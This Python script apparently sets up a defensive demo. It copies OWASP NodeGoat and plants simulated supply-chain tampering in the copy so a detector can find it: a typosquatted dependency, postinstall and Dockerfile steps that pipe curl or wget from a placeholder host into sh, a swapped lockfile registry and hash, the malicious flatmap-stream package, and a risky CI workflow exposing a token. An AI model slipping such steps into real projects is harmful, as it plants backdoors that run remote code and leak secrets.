"""Create the local demo scenario for Day 1.

  targets/nodegoat-baseline  -> pristine copy of the upstream clone (our "known good" state)
  targets/nodegoat-modified  -> same app with simulated supply-chain tampering

Everything is LOCAL ONLY. Nothing is installed, executed or published.
The injected URLs use reserved documentation addresses (203.0.113.0/24, *.example)
so they can never resolve to a real host.

Usage:  python scripts/make_scenario.py
"""
from __future__ import annotations

import json
import shutil
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
UPSTREAM = ROOT / "targets" / "nodegoat-upstream"
BASELINE = ROOT / "targets" / "nodegoat-baseline"
MODIFIED = ROOT / "targets" / "nodegoat-modified"

EVIL_HOST = "203.0.113.10"  # RFC 5737 TEST-NET-3, never routable


def fresh_copy(src: Path, dst: Path) -> None:
    if dst.exists():
        shutil.rmtree(dst)
    shutil.copytree(src, dst, ignore=shutil.ignore_patterns(".git", "node_modules"))


def load(p: Path):
    return json.loads(p.read_text(encoding="utf-8"))


def dump(p: Path, data) -> None:
    p.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")


def tamper_manifest(app: Path) -> None:
    pkg = load(app / "package.json")
    # (A) typosquatted direct dependency: "expresss" (one extra 's')
    pkg["dependencies"]["expresss"] = "^1.0.2"
    # (B) suspicious lifecycle script that downloads and runs remote code
    pkg["scripts"]["postinstall"] = (
        f"node -e \"require('child_process').exec('curl -s http://{EVIL_HOST}/p.sh | sh')\""
    )
    dump(app / "package.json", pkg)


def tamper_lockfile(app: Path) -> None:
    lock = load(app / "package-lock.json")
    pkgs = lock["packages"]
    legacy = lock.get("dependencies", {})

    # (A) typosquat entry with install script
    pkgs[""]["dependencies"]["expresss"] = "^1.0.2"
    pkgs["node_modules/expresss"] = {
        "version": "1.0.2",
        "resolved": "https://registry.npmjs.org/expresss/-/expresss-1.0.2.tgz",
        "integrity": "sha512-QmFkUGFja2FnZURvTm90SW5zdGFsbFRoaXNJc0FEZW1vT25seQ==",
        "hasInstallScript": True,
    }
    legacy["expresss"] = {
        "version": "1.0.2",
        "resolved": pkgs["node_modules/expresss"]["resolved"],
        "integrity": pkgs["node_modules/expresss"]["integrity"],
    }

    # (C) integrity + registry change on an existing package, SAME version
    u = pkgs["node_modules/underscore"]
    u["resolved"] = f"https://npm-mirror.example/underscore/-/underscore-{u['version']}.tgz"
    u["integrity"] = "sha512-VGFtcGVyZWRVbmRlcnNjb3JlSGFzaEZvckd1YXJkaWFuRGVtbw=="
    if "underscore" in legacy:
        legacy["underscore"]["resolved"] = u["resolved"]
        legacy["underscore"]["integrity"] = u["integrity"]

    # (D) unexpected NEW transitive dependency injected under express.
    #     flatmap-stream@0.1.1 is the real malicious package from the 2018
    #     event-stream incident -> OSV knows it as malware.
    pkgs["node_modules/express"]["dependencies"]["flatmap-stream"] = "0.1.1"
    pkgs["node_modules/flatmap-stream"] = {
        "version": "0.1.1",
        "resolved": "https://registry.npmjs.org/flatmap-stream/-/flatmap-stream-0.1.1.tgz",
        "integrity": "sha512-RGVtb0ZsYXRtYXBTdHJlYW1QbGFjZWhvbGRlcg==",
    }
    legacy["flatmap-stream"] = {
        "version": "0.1.1",
        "resolved": pkgs["node_modules/flatmap-stream"]["resolved"],
        "integrity": pkgs["node_modules/flatmap-stream"]["integrity"],
    }
    dump(app / "package-lock.json", lock)


def tamper_dockerfile(app: Path) -> None:
    df = (app / "Dockerfile").read_text(encoding="utf-8")
    # (E) floating base image + remote script piped to shell + drop non-root user
    df = df.replace("FROM node:12-alpine\nENV USER node", "FROM node:latest\nENV USER node", 1)
    df = df.replace(
        "RUN npm install --production --no-cache",
        "RUN npm install --production --no-cache\n"
        f"RUN wget -qO- http://{EVIL_HOST}/setup.sh | sh",
        1,
    )
    df = df.replace("USER $USER\n", "", 1)
    (app / "Dockerfile").write_text(df, encoding="utf-8")


def add_risky_workflow(app: Path) -> None:
    # (F) new CI workflow: pull_request_target + PR head checkout + unpinned 3rd-party action
    wf = app / ".github" / "workflows" / "release.yml"
    wf.write_text(
        """name: Release
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Install
        run: curl -sSL https://get.example/install.sh | bash
      - name: Deploy
        uses: some-org/deploy-action@main
        with:
          token: ${{ secrets.NPM_TOKEN }}
""",
        encoding="utf-8",
    )


def main() -> None:
    if not UPSTREAM.exists():
        raise SystemExit(f"Missing {UPSTREAM}. Clone https://github.com/OWASP/NodeGoat there first.")
    fresh_copy(UPSTREAM, BASELINE)
    fresh_copy(UPSTREAM, MODIFIED)
    tamper_manifest(MODIFIED)
    tamper_lockfile(MODIFIED)
    tamper_dockerfile(MODIFIED)
    add_risky_workflow(MODIFIED)
    print(f"baseline : {BASELINE}")
    print(f"modified : {MODIFIED}")
    print("Injected: typosquat 'expresss' (+install script), postinstall curl|sh, "
          "underscore integrity/registry change, flatmap-stream transitive dep, "
          "Dockerfile node:latest + wget|sh + root user, release.yml pull_request_target")


if __name__ == "__main__":
    main()
